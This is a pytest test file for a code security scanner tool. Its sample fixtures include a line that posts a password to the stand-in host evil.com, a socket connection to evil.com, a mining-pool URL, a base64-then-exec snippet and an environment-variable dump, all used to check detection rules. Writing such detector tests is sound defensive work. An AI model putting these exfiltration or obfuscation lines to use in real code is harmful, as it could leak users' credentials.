"""Tests for Security Scanner Tool and Skill"""
import tempfile
from pathlib import Path

import pytest

from tools.security_scanner_tool import SecurityScannerTool, _scan_content, _RULES


# ─── 测试样本 ────────────────────────────────────────────────────────

SAFE_CODE = """def hello():
    name = input("What is your name? ")
    return f"Hello, {name}!"
"""

DANGEROUS_EXEC = """import subprocess
result = subprocess.run(["ls", "-la"], capture_output=True)
"""

DYNAMIC_CODE = """code = "print('hello')"
eval(code)
"""

CRYPTO_MINING = """pool_url = "stratum+tcp://pool.supportxmr.com:5555"
"""

EXFILTRATION = """import requests
requests.post("https://evil.com/upload", data={"password": password})
"""

OBFUSCATION = """import base64
code = base64.b64decode("cHJpbnQoJ2hlbGxvJyk=")
exec(code)
"""

ENV_HARVESTING = """import os
env_vars = dict(os.environ)
"""

SUSPICIOUS_NETWORK = """import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("evil.com", 9050))
"""

MIXED_CODE = """import os
import subprocess

def normal_function():
    name = input("Enter name: ")
    return f"Hello {name}"

def suspicious():
    env = dict(os.environ)
    subprocess.run(["malware"])
"""


# ─── Tool 测试 ───────────────────────────────────────────────────────

class TestSecurityScannerTool:
    def setup_method(self):
        self.tool = SecurityScannerTool()

    def test_string_input_returns_error(self):
        result = self.tool.call("scan")
        assert result["status"] == "error"

    def test_no_action_returns_error(self):
        result = self.tool.call({})
        assert result["status"] == "error"

    def test_unknown_action_returns_error(self):
        result = self.tool.call({"action": "invalid"})
        assert result["status"] == "error"

    def test_scan_text_safe_code(self):
        result = self.tool.call({"action": "scan_text", "text": SAFE_CODE, "source": "safe.py"})
        assert result["status"] == "ok"
        assert result["data"]["clean"] is True
        assert result["data"]["match_count"] == 0

    def test_scan_text_dangerous_exec(self):
        result = self.tool.call({"action": "scan_text", "text": DANGEROUS_EXEC, "source": "danger.py"})
        assert result["status"] == "ok"
        assert result["data"]["clean"] is False
        assert result["data"]["match_count"] >= 1
        rule_ids = [m["rule_id"] for m in result["data"]["matches"]]
        assert "dangerous-exec" in rule_ids

    def test_scan_text_dynamic_code(self):
        result = self.tool.call({"action": "scan_text", "text": DYNAMIC_CODE})
        assert result["status"] == "ok"
        assert result["data"]["clean"] is False
        rule_ids = [m["rule_id"] for m in result["data"]["matches"]]
        assert "dynamic-code" in rule_ids

    def test_scan_text_crypto_mining(self):
        result = self.tool.call({"action": "scan_text", "text": CRYPTO_MINING})
        assert result["status"] == "ok"
        assert result["data"]["clean"] is False
        rule_ids = [m["rule_id"] for m in result["data"]["matches"]]
        assert "crypto-mining" in rule_ids

    def test_scan_text_exfiltration(self):
        result = self.tool.call({"action": "scan_text", "text": EXFILTRATION})
        assert result["status"] == "ok"
        rule_ids = [m["rule_id"] for m in result["data"]["matches"]]
        assert "exfiltration" in rule_ids

    def test_scan_text_obfuscation(self):
        result = self.tool.call({"action": "scan_text", "text": OBFUSCATION})
        assert result["status"] == "ok"
        rule_ids = [m["rule_id"] for m in result["data"]["matches"]]
        assert "obfuscation" in rule_ids

    def test_scan_text_env_harvesting(self):
        result = self.tool.call({"action": "scan_text", "text": ENV_HARVESTING})
        assert result["status"] == "ok"
        rule_ids = [m["rule_id"] for m in result["data"]["matches"]]
        assert "env-harvesting" in rule_ids

    def test_scan_text_suspicious_network(self):
        result = self.tool.call({"action": "scan_text", "text": SUSPICIOUS_NETWORK})
        assert result["status"] == "ok"
        rule_ids = [m["rule_id"] for m in result["data"]["matches"]]
        assert "suspicious-network" in rule_ids

    def test_scan_text_empty(self):
        result = self.tool.call({"action": "scan_text", "text": ""})
        assert result["status"] == "ok"
        assert result["data"]["clean"] is True

    def test_scan_mixed_code_detects_multiple(self):
        result = self.tool.call({"action": "scan_text", "text": MIXED_CODE})
        assert result["status"] == "ok"
        assert result["data"]["match_count"] >= 2

    def test_list_rules(self):
        result = self.tool.call({"action": "rules"})
        assert result["status"] == "ok"
        assert result["data"]["rule_count"] == 7
        rule_ids = {r["id"] for r in result["data"]["rules"]}
        expected = {"dangerous-exec", "dynamic-code", "crypto-mining",
                     "exfiltration", "obfuscation", "env-harvesting", "suspicious-network"}
        assert rule_ids == expected

    def test_scan_file_valid(self):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(DANGEROUS_EXEC)
            f.flush()
            result = self.tool.call({"action": "scan_file", "path": f.name})
            Path(f.name).unlink()
        assert result["status"] == "ok"
        assert result["data"]["clean"] is False

    def test_scan_file_not_found(self):
        result = self.tool.call({"action": "scan_file", "path": "/nonexistent/file.py"})
        assert result["status"] == "error"

    def test_scan_file_empty_path(self):
        result = self.tool.call({"action": "scan_file", "path": ""})
        assert result["status"] == "error"

    def test_scan_custom_rules(self):
        result = self.tool.call({
            "action": "scan_rules",
            "rules": ["dangerous-exec"],
            "text": DANGEROUS_EXEC,
        })
        assert result["status"] == "ok"
        assert result["data"]["clean"] is False
        assert result["data"]["rules_applied"] == ["dangerous-exec"]

    def test_scan_custom_rules_filters_correctly(self):
        # Only dangerous-exec rule, should NOT detect dynamic-code
        result = self.tool.call({
            "action": "scan_rules",
            "rules": ["dangerous-exec"],
            "text": DYNAMIC_CODE,
        })
        assert result["status"] == "ok"
        assert result["data"]["clean"] is True

    def test_scan_custom_rules_unknown_rule(self):
        result = self.tool.call({
            "action": "scan_rules",
            "rules": ["nonexistent"],
            "text": "test",
        })
        assert result["status"] == "error"

    def test_match_has_required_fields(self):
        result = self.tool.call({"action": "scan_text", "text": DANGEROUS_EXEC})
        m = result["data"]["matches"][0]
        assert "rule_id" in m
        assert "line" in m
        assert "snippet" in m
        assert "description" in m


# ─── 核心函数测试 ────────────────────────────────────────────────────

class TestCoreFunctions:
    def test_scan_content_returns_list(self):
        result = _scan_content(SAFE_CODE)
        assert isinstance(result, list)
        assert len(result) == 0

    def test_scan_content_detects_danger(self):
        result = _scan_content(DANGEROUS_EXEC)
        assert len(result) >= 1

    def test_all_rules_have_unique_ids(self):
        ids = [r.id for r in _RULES]
        assert len(ids) == len(set(ids))

    def test_all_rules_have_patterns(self):
        for r in _RULES:
            assert len(r.patterns) >= 1, f"Rule {r.id} has no patterns"

    def test_all_rules_have_description(self):
        for r in _RULES:
            assert r.description, f"Rule {r.id} has no description"


# ─── Edge Cases ──────────────────────────────────────────────────────

class TestEdgeCases:
    def test_snippet_truncation(self):
        """超长行 snippet 截断到 120 字符。"""
        long_line = "x = " + "A" * 500
        result = _scan_content(f"import subprocess\nsubprocess.run(['ls'])\n{long_line}")
        for m in result:
            assert len(m["snippet"]) <= 120

    def test_unicode_content(self):
        """Unicode 内容不崩溃。"""
        result = _scan_content("print('你好世界')\nimport subprocess\nsubprocess.run(['ls'])")
        assert len(result) >= 1

    def test_binary_content_doesnt_crash(self):
        """二进制内容不崩溃（用 replace errors 处理）。"""
        result = _scan_content("import subprocess\n\x00\x01\x02\xff\xfe\nsubprocess.run(['ls'])")
        assert len(result) >= 1
